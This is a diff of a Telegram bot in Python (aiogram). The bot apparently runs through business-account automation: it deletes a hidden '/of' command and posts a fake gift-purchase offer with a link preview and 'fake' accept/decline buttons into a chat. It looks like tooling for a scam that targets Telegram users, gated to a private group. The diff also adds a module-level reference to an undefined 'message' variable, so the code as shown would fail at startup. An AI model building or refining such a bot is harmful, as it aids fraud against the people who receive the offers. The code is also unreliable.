@@ -4,22 +4,18 @@ import re
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
-from aiogram.exceptions import TelegramBadRequest
-
-print("--- 1. ИМПОРТЫ ПРОШЛИ УСПЕШНО ---")
+from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-if not BOT_TOKEN:
-    print("!!! КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN НЕ НАЙДЕН В СЕКРЕТАХ GITHUB !!!")
-    exit(1) # Принудительно выключаем скрипт, если токена нет
-
-print("--- 2. ТОКЕН НАЙДЕН, ИНИЦИАЛИЗАЦИЯ БОТА ---")
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 TARGET_CHAT_ID = -1003747516067
 INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
 active_users = set()
+
+# Мой ID (нужен, чтобы бот присылал ошибки тебе)
+ADMIN_ID = message.from_user.id # Будет перезаписан ниже динамически
 
 MESSAGES = {
     "ru": {
@@ -65,17 +61,18 @@ async def is_subscribed(user_id: int) -> bool:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"Ошибка проверки подписки: {e}")
         return True 
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
+    global ADMIN_ID
+    ADMIN_ID = message.from_user.id # Запоминаем твой ID для отправки ошибок
+    
     if not await is_subscribed(message.from_user.id):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]])
         await message.answer("⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>", reply_markup=keyboard, parse_mode="HTML")
         return
-    text = "<b>Как начать:</b>\nОтправь /ofteam\n\n<b>Формат оффера:</b>\n<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>"
-    await message.answer(text, parse_mode="HTML")
+    await message.answer("<b>Как начать:</b>\nОтправь /ofteam\n\n<b>Формат оффера:</b>\n<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>", parse_mode="HTML")
 
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
@@ -93,9 +90,13 @@ async def block_offer_in_pm(message: types.Message):
 
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
-    print(f"ПОЛУЧЕНА КОМАНДА: {message.text}")
     business_connection_id = message.business_connection_id
+    
+    # Если бот каким-то чудом не получил ID подключения
     if not business_connection_id:
+        try:
+            await bot.send_message(ADMIN_ID, "⚠️ <b>Ошибка:</b> Бот не получил business_connection_id. Проверьте, включена ли автоматизация в этом чате.")
+        except: pass
         return
 
     parts = message.text.split()
@@ -126,18 +127,23 @@ async def handle_offer_command(message: types.Message):
     caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
 
     try:
+        # 1. Пробуем удалить
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
+        
+        # 2. Пробуем отправить
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
         await bot.send_message(chat_id=message.chat.id, text=caption_text, reply_markup=keyboard, business_connection_id=business_connection_id, parse_mode="HTML", link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True))
-        print("--- ОФФЕР УСПЕШНО ОТПРАВЛЕН ---")
+        
     except Exception as e:
-        print(f"ОШИБКА ОТПРАВКИ: {e}")
+        # ЕСЛИ ОШИБКА - ОТПРАВЛЯЕМ ТЕБЕ В ЛИЧКУ, ЧТОБЫ ТЫ ЗНАЛ ПРИЧИНУ
+        error_text = f"⚠️ <b>Ошибка в чате с {username}</b>\nПричина: <code>{e}</code>"
         try:
-            await bot.send_message(chat_id=message.from_user.id, text=f"⚠️ Ошибка:\n<code>{e}</code>", parse_mode="HTML")
+            await bot.send_message(ADMIN_ID, error_text, parse_mode="HTML")
         except: pass
+        print(f"Ошибка: {e}")
 
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
@@ -172,13 +178,12 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         await bot.send_message(**kwargs)
         await callback.answer()
     except Exception as e:
-        print(f"Ошибка обработки кнопки: {e}")
+        print(f"Ошибка кнопки: {e}")
         await callback.answer("Ошибка", show_alert=True)
 
 async def main():
-    print("--- 3. ЗАПУСК POLLING ---")
+    print("Бот запущен...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    print("--- 4. ВЫЗОВ ФУНКЦИИ MAIN ---")
     asyncio.run(main())
